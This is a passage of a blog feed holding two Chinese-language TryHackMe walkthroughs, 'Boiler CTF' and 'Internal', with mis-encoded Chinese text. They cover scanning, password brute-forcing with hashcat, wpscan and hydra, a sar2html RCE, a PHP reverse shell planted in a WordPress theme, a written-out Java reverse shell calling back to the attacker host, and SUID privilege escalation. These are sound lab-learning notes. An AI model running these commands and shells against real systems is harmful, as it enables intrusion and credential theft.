    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.20.169</p><p>ÊîªÂáªÊú∫ipÔºö 10.11.101.220</p></blockquote><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><p><code>nmap --min-rate 10000 -p- -sV -sC 10.10.20.169 -oN reports/namp</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007155138247-2005312162.png" alt="image-20241007155136615"></p><p>ÂèëÁé∞ÂºÄÊîæ21Ôºå80Ôºå10000Ôºå55007Á´ØÂè£Ôºå55007Á´ØÂè£ËøêË°åÁùÄsshÊúçÂä°</p><h2 id="21Á´ØÂè£">21Á´ØÂè£</h2><p>Ê†πÊçÆnmapÁöÑÁªìÊûúÂèëÁé∞ftpÂèØ‰ª•ÂåøÂêçÁôªÂΩï</p><p><code>ftp anonymous@10.10.20.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007153623844-1063595684.png" alt="image-20241007153622117"></p><p>ÂèëÁé∞ÈöêËóèÊñá‰ª∂<code>.info.txt</code>Ôºå<code>get</code>‰∏ãÊù•Êü•Áúã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007153723166-2130415327.png" alt="image-20241007153721753"></p><p>ÂÜÖÂÆπÂÉèÊòØË¢´<code>rot13</code>Âä†ÂØÜËøáÁöÑÔºåÂ∞ùËØïËß£ÂØÜ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007154329949-234648714.png" alt="image-20241007154328354"></p><p>Ëß£ÂØÜÂêéÂèëÁé∞ÊòØ‰∏Ä‰∏™ÊèêÁ§∫ÊÄßÁöÑÊñáÂ≠óÔºåÂëäËØâÊàë‰ª¨ÈúÄË¶ÅÊûö‰∏æ</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007155409570-1133252866.png" alt="image-20241007155407443"></p><p>ÈªòËÆ§È°µÈù¢ÊòØ‰∏Ä‰∏™<code>apache</code>ÁöÑÂàùÂßãÈ°µÈù¢</p><p>ÂÖàÊâ´Êèè‰∏Ä‰∏ãÁõÆÂΩï</p><p><code>gobuster dir -u http://10.10.20.169/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007160930195-2042932885.png" alt="image-20241007160928359"></p><p>ÂèëÁé∞ÂæàÂ§öÊúâÊÑèÊÄùÁöÑÁõÆÂΩïÔºåÊü•Áúã‰∏Ä‰∏ã</p><h3 id="robots-txt">robots.txt</h3><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007161042789-96937162.png" alt="image-20241007161041169"></p><p>ÁªôÁöÑÁõÆÂΩïÂπ∂Ê≤°ÊúâÂÜÖÂÆπËøîÂõûÈÉΩÊòØ404ÔºåÈáçÁÇπÁúã‰∏ãÈù¢ÁöÑ‰∏Ä‰∏≤Êï∞ÊçÆ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162017100-1297401618.png" alt="image-20241007162015403"></p><p>Ëß£ÂØÜÂêéÂæóÂà∞Âè¶‰∏Ä‰∏≤Êï∞ÊçÆ<code>99b0660cd95adea327c54182baa51584</code></p><p>ÁúãËµ∑Êù•ÂÉèmd5Êï∞ÊçÆÔºå‰ΩøÁî®<code>hashcat</code>Ëß£ÂØÜ</p><p><code>hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162349391-1423906262.png" alt="image-20241007162347491"></p><p>Ëß£Âá∫Êù•ÁöÑÊï∞ÊçÆÊòØ<code>kidding</code>ÔºåÁé∞Âú®ÁúãÊù•Ê≤°‰ªÄ‰πàÁî®</p><h3 id="manual">manual</h3><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162655725-2004416225.png" alt="image-20241007162653988"></p><p>ÊòØ‰∏Ä‰∏™<code>apache</code>ÁöÑÊñáÊ°£ÔºåÂèØ‰ª•Áü•ÈÅìÁöÑÊòØÁâàÊú¨Âè∑ÊòØ2.4</p><h3 id="joomla">joomla</h3><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162747852-2035223215.png" alt="image-20241007162746149"></p><p>ËøôÊòØ‰∏Ä‰∏™cms</p><h1>Ëé∑ÂèñÂàùÂßãshell</h1><p>ÂàöÊâçÁü•ÈÅì‰∫ÜÊòØ<code>joomla</code>Á≥ªÁªüÔºåÁªßÁª≠Ê∑±ÂÖ•Êâ´Êèè‰∏Ä‰∏ãÁõÆÂΩï</p><p><code>gobuster dir -u http://10.10.20.169/joomla -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007163608399-43319589.png" alt="image-20241007163606266"></p><p>ËøôÊ¨°ÁõÆÂΩïÊúâÁÇπÂ§ö</p><p>ÊµãËØïÂêéÂèëÁé∞Âè™ÊúâÂá†‰∏™ÊúâÂÜÖÂÆπ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007164556241-928049236.png" alt="image-20241007164554560"></p><p>ÊúÄÈáçË¶ÅÁöÑÊòØËøô‰∏™ÔºåÂú®<code>/joomla/_test</code>ÁõÆÂΩï‰∏ãÂèëÁé∞Êúâ<a href="https://www.onworks.net/zh-CN/software/app-sar2html">sar2html</a></p><p>‰ΩøÁî®<code>searchsploit</code>ÊêúÁ¥¢‰∏Ä‰∏ãÁõ∏ÂÖ≥ÊºèÊ¥û</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007165329033-1102727197.png" alt="image-20241007165327179"></p><p>Áî®ÁöÑÊòØÁ¨¨‰∏Ä‰∏™ÔºåÂ§çÂà∂Âà∞ÂΩìÂâçÁõÆÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007165423725-2036887988.png" alt="image-20241007165422004"></p><p>Êü•ÁúãÂÜÖÂÆπÂêéÂèëÁé∞ÊòØÂú®urlÂ§ÑÊéßÂà∂<code>plot</code>ÂèÇÊï∞ÔºåÈÄöËøáÂÄºÊãºÊé•ÂÆûÁé∞RCEÔºåÂà©Áî®‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170011069-1384604430.png" alt="image-20241007170009665"></p><p>ÂëΩ‰ª§ÊâßË°åÊàêÂäü</p><p>Êü•Áúã‰∏Ä‰∏ã<code>log.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170051671-1800575054.png" alt="image-20241007170050140"></p><p>ÂèëÁé∞<code>basterd</code>Áî®Êà∑‰ΩøÁî®ÂØÜÁ†Å <code>superduperp@$$</code>ÈÄöËøásshËøûÊé•Êú∫Âô®ÔºåÊàë‰ª¨‰πãÂâçÊâ´ÊèèÁªìÊûú‰∏≠sshÁ´ØÂè£ÂèëÁé∞ÊòØ55007</p><p>Êàë‰ª¨‰ΩøÁî®Ëøô‰∏™Âá≠ÊçÆÂ∞ùËØïËøûÊé•</p><p><code>ssh basterd@10.10.20.169 -p 55007</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170420582-601376213.png" alt="image-20241007170418958"></p><p>ËøûÊé•ÊàêÂäüÔºåÊãøÂà∞<code>basterd</code>Áî®Êà∑ÁöÑshell</p><h1>Ê®™ÂêëÁßªÂä®</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170547184-1714231114.png" alt="image-20241007170545779"></p><p>Âú®<code>/home/basterd</code>ÁõÆÂΩïÂèëÁé∞<code>backup.sh</code>Êñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170641598-69828711.png" alt="image-20241007170639847"></p><p>Êü•ÁúãÂêéÂèëÁé∞Âè¶‰∏Ä‰∏™Áî®Êà∑<code>stoner</code>Ôºå‰ª•ÂèäÂØÜÁ†Å<code>superduperp@$$no1knows</code>ÔºåÁõ¥Êé•ÁôªÂΩï<code>stoner</code>Áî®Êà∑</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171143692-1069757611.png" alt="image-20241007171142250"></p><p>ÁôªÈôÜÊàêÂäü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171247398-1778280610.png" alt="image-20241007171245935"></p><p>Âú®<code>/home/stoner</code>ÁõÆÂΩï‰∏ãÊâæÂà∞ÈöêËóèÊñá‰ª∂<code>.secret</code>ÔºåÂÖ∂ÂÜÖÂÆπÂ∞±ÊòØ<code>user.txt</code></p><h1>ÊùÉÈôêÊèêÂçá</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171443860-578181515.png" alt="image-20241007171442288"></p><p>Âπ∂Ê≤°Êúâ‰ªÄ‰πàÂèØ‰ª•Âà©Áî®ÁöÑ</p><p>‰ΩøÁî®<code>find</code>ÁúãÁúãËÉΩÂê¶ÊúâÊèêÊùÉÁöÑÊú∫‰ºö</p><p><code>find / -perm -u=s -type f 2&gt; /dev/null</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171623374-472604132.png" alt="image-20241007171621747"></p><p>ÂèëÁé∞ÊúâfindÔºåÂà©Áî®findÂëΩ‰ª§ÊèêÊùÉ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171908473-623085440.png" alt="image-20241007171907091"></p><p>ÊèêÊùÉÊàêÂäü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171951300-1248330287.png" alt="image-20241007171949819"></p><p>ÂêåÊ†∑Âú®<code>/root</code>ÁõÆÂΩï‰∏ãËé∑ÂèñÂà∞<code>root.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007172145341-43973699.png" alt="image-20241007172143822"></p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãBoiler CTF</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
    <category term="Linux" scheme="https://www.fomal.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-Internal</title>
    <link href="https://www.fomal.cc/posts/a77e166e.html"/>
    <id>https://www.fomal.cc/posts/a77e166e.html</id>
    <published>2024-10-07T04:37:32.000Z</published>
    <updated>2024-10-27T12:33:33.567Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.27.141</p><p>ÊîªÂáªÊú∫ipÔºö 10.11.101.220</p></blockquote><h1>ÂÜôÂú®ÂâçÈù¢</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125007253-1199614277.png" alt="image-20241007125005114"></p><p>Ë¶ÅÂ∞Ü<code>internal.thm</code>Ê∑ªÂä†Âà∞<code>/etc/hosts</code> Êñá‰ª∂‰∏≠</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125108994-1194412670.png" alt="image-20241007125107606"></p><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><p><code>nmap --min-rate 10000 -sS -sV -sC 10.10.27.141 -oN reports/nmap</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125129049-1554175018.png" alt="image-20241007125127613"></p><p>ÂèëÁé∞ÂºÄÊîæ22Á´ØÂè£Âíå80Á´ØÂè£</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125454844-2082201762.png" alt="image-20241007125453302"></p><p>ÊòØ‰∏Ä‰∏™<code>apache</code>ÁöÑÂàùÂßãÈ°µÈù¢ÔºåÊâ´Êèè‰∏Ä‰∏ãÁõÆÂΩï</p><p><code>gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125552143-1556052638.png" alt="image-20241007125550493"></p><p>ËÆøÈóÆ‰∏Ä‰∏ã</p><ul><li><code>/blog</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125736845-1392160763.png" alt="image-20241007125734839"></p><ul><li><code>/javascript</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125747452-224993723.png" alt="image-20241007125745983"></p><ul><li><code>/phpmyadmin</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125756599-644411919.png" alt="image-20241007125755191"></p><ul><li><code>/wordpress</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125807763-1396057649.png" alt="image-20241007125806157"></p><p>‰∏çÈöæÁúãÂá∫ÔºåËøôÊòØ‰∏Ä‰∏™<code>wordpress</code>ÁöÑÁïåÈù¢Ôºå<code>wordpress</code>Âíå<code>blog</code>ÊòØ‰∏Ä‰∏™È°µÈù¢ÔºåËøôÈáå‰ª•<code>/blog</code>‰∏∫‰∏ªÔºåÂêåÊó∂ËøòÊúâ‰∏™<code>phpMyAdmin</code></p><h1>Ëé∑ÂèñÂàùÂßãshell</h1><h2 id="ÁôªÂΩïwordpress">ÁôªÂΩïwordpress</h2><p>ÂÖàÁúã‰∏ã<code>phpMyAdmin</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007130433898-1261641608.png" alt="image-20241007130432070"></p><p>Êü•ÁúãÊ∫êÁ†ÅÂèëÁé∞ÁâàÊú¨Âè∑ÊòØ<code>4.6.6</code>ÔºåÈÄöËøá<code>searchsploit</code>ÊêúÁ¥¢ÂêéÂèëÁé∞Ê≤°Êúâ‰ªÄ‰πàÂèØ‰ª•Âà©Áî®ÁöÑÔºåÂ∞ÜÊ≥®ÊÑèÂäõËΩ¨ÁßªÂà∞<code>wordpress</code></p><p>‰ΩøÁî®<code>wpscan</code>Êâ´Êèè‰∏Ä‰∏ã</p><p><code>wpscan --url http://internal.thm/blog/ -e</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007132506908-1533969406.png" alt="image-20241007132505372"></p><p>ÂèëÁé∞Êúâ‰∏™adminË¥¶Êà∑ÔºåÂ∞ùËØïÁ†¥Ëß£‰∏Ä‰∏ãÂØÜÁ†Å</p><p><code>wpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007133734282-1690665278.png" alt="image-20241007133732602"></p><p>ÁàÜÁ†¥ÊàêÂäüÔºåÊâæÂà∞‰∫Ü<code>admin</code>Ë¥¶Êà∑ÁöÑÂØÜÁ†Å<code>my2boys </code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007133911002-255471056.png" alt="image-20241007133909433"></p><p>ÊàêÂäüÁôªÂΩï</p><h2 id="shellËé∑Âèñ">shellËé∑Âèñ</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007134757805-2134124194.png" alt="image-20241007134755947"></p><p>Âú®ËøôÈáåÂèëÁé∞ÂèØ‰ª•ÈöèÊÑèÊõ¥ÊîπÊñá‰ª∂ÂÜÖÂÆπ„ÄÇËøôÈáåÂ∞Ü<code>404.php</code>ÂÜÖÂÆπÊîπÊàêÂèçÂºπshellÁöÑÊñá‰ª∂ÊòØ<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell</a>Ôºå‰øÆÊîπ<code>ip</code>Âíå<code>port</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135148884-1540858205.png" alt="image-20241007135147307"></p><p>ÁÇπÂáª‰∏ã‰π∞‰Ω†ÁöÑÊõ¥Êñ∞Êñá‰ª∂„ÄÇÁÑ∂ÂêéÂú®kali‰∏äÂàõÂª∫ÁõëÂê¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135222394-569063211.png" alt="image-20241007135221038"></p><p>Áé∞Âú®ÈúÄË¶ÅÊâæÂà∞<code>404.php</code>Êñá‰ª∂ÁöÑ‰ΩçÁΩÆÔºå‰ªéË∑ØÁî±‰∏≠ÂèØ‰ª•ÁúãÂà∞‰∏ªÈ¢òÊòØ<code>twentyseventeen</code>ÔºåËÄå‰∏îÂ§ßÂ§öÊï∞‰∏ªÈ¢ò‰Ωç‰∫é<code>wp-content</code> ÁõÆÂΩï‰∏ãÔºå‰∏ªÈ¢ò‰Ωç‰∫é<code>/wp-content/themes</code>ÁõÆÂΩï‰∏ãÔºåÊâÄ‰ª•<code>404.php</code>Êñá‰ª∂ÁöÑ‰ΩçÁΩÆÊòØÔºö<code>/wp-content/themes/twentyseventeen/404.php</code></p><p>ËÆøÈóÆÊñá‰ª∂<code>http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135720735-27264363.png" alt="image-20241007135719154"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135738379-51772723.png" alt="image-20241007135736972"></p><p>ËøôÊ†∑Êàë‰ª¨Â∞±ÊãøÂà∞‰∫Ü‰ΩéÊùÉÁî®Êà∑ÁöÑshell</p><p>ÂÖàËé∑Âèñ‰∫§‰∫íÂºèshell</p><p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135936004-77642626.png" alt="image-20241007135934513"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140015991-900638678.png" alt="image-20241007140014508"></p><p>Âú®<code>/home</code>ÁõÆÂΩï‰∏ãÊúâ‰∏™<code>aubreanna</code>Áî®Êà∑ÔºåÁé∞Âú®ÁõÆÊ†áÂ∞±ÊòØÊèêÂçáËá≥userÊùÉÈôê</p><h1>ÊèêÂçáËá≥userÊùÉÈôê</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140610859-829745507.png" alt="image-20241007140609325"></p><p>Âú®ÁøªÈòÖÁõÆÂΩïÁöÑËøáÁ®ã‰∏≠ÂèëÁé∞Âú® <code>/opt</code>ÁõÆÂΩï‰∏ãÊúâ‰∏™<code>wp-save.txt</code>Êñá‰ª∂ÔºåÂπ∂‰∏îËøôÊòØÊàë‰ª¨ÂèØ‰ª•Êü•ÁúãÁöÑÊñá‰ª∂ÔºåÊü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140728583-62091955.png" alt="image-20241007140727188"></p><p>ÂæóÂà∞‰∫Ü<code>aubreanna</code>Áî®Êà∑ÁöÑÂØÜÁ†Å<code>bubb13guM!@#123</code>ÔºåÁôªÂΩï<code>aubreanna</code>Áî®Êà∑</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140837240-798440971.png" alt="image-20241007140835640"></p><p>ÊàêÂäüÁôªÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140901515-1447831069.png" alt="image-20241007140900121"></p><p>Âú®<code>/home/aubreanna</code>‰∏ãÊâæÂà∞<code>user.txt</code></p><h1>ÊèêÂçáËá≥rootÊùÉÈôê</h1><p>ÂèëÁé∞Âú®Ëøô‰∏™ÁõÆÂΩïËøòÊúâ<code>jenkins.txt</code>Êñá‰ª∂ÔºåÊü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007141130806-1153980717.png" alt="image-20241007141129333"></p><p>ÂëäËØâÊàë‰ª¨ÂÜÖÁΩë<code>Jenkins</code>ÊúçÂä°ÁöÑÂú∞ÂùÄÊòØ<code>172.17.0.2:8080</code></p><p>ÂÖàÁÆÄÂçïÁúã‰∏Ä‰∏ãÊúçÂä°</p><p><code>curl http://172.17.0.2:8080</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007141312485-108597353.png" alt="image-20241007141310725"></p><p>Áî±‰∫éÁõÆÊ†áÊú∫Âô®ÁöÑÁ´ØÂè£<code>8080</code>Âè™ËÉΩÈÄöËøáÁõÆÊ†áÊú∫ÁöÑÊú¨Âú∞ËøõË°åËÆøÈóÆÔºåÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅËÆæÁΩÆSSHÁ´ØÂè£ËΩ¨ÂèëÔºå‰ªéËÄåÂ∞ÜÁõÆÊ†áÊú∫Âô®<code>8080</code>Á´ØÂè£‰∏äÁöÑÊµÅÈáèÈáçÂÆöÂêëÂà∞Êàë‰ª¨Êú¨Âú∞ÊîªÂáªÊú∫‰∏äÁöÑÂú∞ÂùÄÂíåÁ´ØÂè£<code>localhost:8081</code>ÔºåÂú®ÊîªÂáªÊú∫‰∏äÁöÑÁªàÁ´ØÁïåÈù¢ÊûÑÈÄ†Â¶Ç‰∏ãÂëΩ‰ª§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -L 8081:172.17.0.2:8080 aubreanna@internal.thm</span><br><span class="line"><span class="comment">#Ê†πÊçÆÂâçËø∞ÁªìÊûúÔºåÁôªÂΩïÂØÜÁ†Å‰∏∫Ôºöbubb13guM!@#123</span></span><br><span class="line"><span class="comment">#sshÁ´ØÂè£ËΩ¨Âèë(Êú¨Âú∞ÁΩëÂç°Âú∞ÂùÄ0.0.0.0ÂèØÁúÅÁï•)ÔºöHostB$ ssh -L 0.0.0.0:PortB:HostC:PortC user@HostC</span></span><br><span class="line"><span class="comment">#ÂèÇÊï∞ËØ¥Êòé</span></span><br><span class="line"><span class="comment">#-CÔºöÂéãÁº©Êï∞ÊçÆ</span></span><br><span class="line"><span class="comment">#-f ÔºöÂêéÂè∞ËÆ§ËØÅÁî®Êà∑/ÂØÜÁ†ÅÔºåÈÄöÂ∏∏Âíå-NËøûÁî®Ôºå‰∏çÁî®ÁôªÂΩïÂà∞ËøúÁ®ã‰∏ªÊú∫„ÄÇ</span></span><br><span class="line"><span class="comment">#-N Ôºö‰∏çÊâßË°åËÑöÊú¨ÊàñÂëΩ‰ª§ÔºåÈÄöÂ∏∏‰∏é-fËøûÁî®„ÄÇ</span></span><br><span class="line"><span class="comment">#-g ÔºöÂú®-L/-R/-DÂèÇÊï∞‰∏≠ÔºåÂÖÅËÆ∏ËøúÁ®ã‰∏ªÊú∫ËøûÊé•Âà∞Âª∫Á´ãËΩ¨ÂèëÁöÑÁ´ØÂè£ÔºåÂ¶ÇÊûú‰∏çÂä†Ëøô‰∏™ÂèÇÊï∞ÔºåÂè™ÂÖÅËÆ∏Êú¨Âú∞‰∏ªÊú∫Âª∫Á´ãËøûÊé•„ÄÇ</span></span><br><span class="line"><span class="comment">#-L : Êú¨Âú∞ÈößÈÅìÔºåÊú¨Âú∞Á´ØÂè£:ÁõÆÊ†áIP:ÁõÆÊ†áÁ´ØÂè£</span></span><br><span class="line"><span class="comment">#-D : Âä®ÊÄÅÁ´ØÂè£ËΩ¨Âèë</span></span><br><span class="line"><span class="comment">#-R : ËøúÁ®ãÈößÈÅì</span></span><br><span class="line"><span class="comment">#-T Ôºö‰∏çÂàÜÈÖç TTY Âè™ÂÅö‰ª£ÁêÜÁî®</span></span><br><span class="line"><span class="comment">#-q ÔºöÂÆâÈùôÊ®°ÂºèÔºå‰∏çËæìÂá∫ ÈîôËØØ/Ë≠¶Âëä ‰ø°ÊÅØ</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007143027902-1109898380.png" alt="image-20241007143026526"></p><p>ËæìÂÖ•ÂØÜÁ†ÅÂêéÂç≥ÂèØËÆøÈóÆÊúçÂä°</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007143014999-1246675905.png" alt="image-20241007143013118"></p><p>ÁΩë‰∏äÁöÑÈªòËÆ§ÂØÜÁ†ÅÊó†Ê≥ïÁôªÂΩïÔºåËøôÈáå‰ΩøÁî®<code>hydra</code>Êö¥ÂäõÁ†¥Ëß£ÔºåÂÖàÊâæÂà∞ÁôªÂΩïÊ°ÜÁöÑË°®ÂçïÂÜÖÂÆπ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007144307417-1663244639.png" alt="image-20241007144305568"></p><p>ÊâæÂà∞ÂêéÂ∞±ÂèØ‰ª•ÊûÑÈÄ†ÂëΩ‰ª§‰∫Ü</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8081 127.0.0.1 http-post-form &quot;/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&quot;</span><br><span class="line"></span><br><span class="line">#&quot;/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:F=Invalid username or password&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145155569-23242268.png" alt="image-20241007145153970"></p><p>ÊàêÂäüÁàÜÁ†¥Âá∫ÂØÜÁ†Å<code>spongebob</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145245979-419572187.png" alt="image-20241007145244248"></p><p>ÊàêÂäüÁôªÂΩïÔºÅ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145414836-343618295.png" alt="image-20241007145413172"></p><p>Âú®ÁÆ°ÁêÜÁïåÈù¢ÔºåÊúâ‰∏Ä‰∏™ÂèØ‰ª•ÊâßË°åÂëΩ‰ª§ÁöÑÂú∞ÊñπÔºåÂú®ÊîªÂáªÊú∫ÂÖàÂª∫Á´ãÁõëÂê¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145514017-720666410.png" alt="image-20241007145512664"></p><p>ÁÑ∂ÂêéÂÜçÊâßË°åÂèçÂºπshellÁöÑÂëΩ‰ª§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String host=<span class="string">&quot;10.11.101.220&quot;</span>;</span><br><span class="line"><span class="type">int</span> port=<span class="number">8889</span>;</span><br><span class="line">String cmd=<span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">Process p=<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).redirectErrorStream(<span class="literal">true</span>).start();Socket s=<span class="keyword">new</span> <span class="title class_">Socket</span>(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.exitValue();<span class="keyword">break</span>;&#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145627071-645137157.png" alt="image-20241007145625573"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145649065-1090977695.png" alt="image-20241007145647641"></p><p>ÊãøÂà∞<code>jenkins</code>ÁöÑshell</p><p>ËΩ¨Âà∞‰∫§‰∫íÂºèshell</p><p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145819229-990567029.png" alt="image-20241007145817874"></p><p>‰æùÊóßÊòØÂú®ËÄÅ‰ΩçÁΩÆ<code>/opt</code>‰∏ãÊâæÂà∞<code>note.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145855094-105871939.png" alt="image-20241007145853700"></p><p>ÂæóÂà∞<code>root</code>Áî®Êà∑ÁöÑÂØÜÁ†ÅÔºö<code>tr0ub13guM!@#123</code></p><p>Áõ¥Êé•<code>ssh</code>ÁôªÂΩï<code>root</code></p><p><code>ssh root@10.10.27.141</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007150058524-1354823152.png" alt="image-20241007150056965"></p><p>ÊàêÂäüÁôªÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007150120478-264508902.png" alt="image-20241007150119151"></p><p>Âú®ÂΩìÂâçÁõÆÂΩïÊâæÂà∞<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãInternal</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
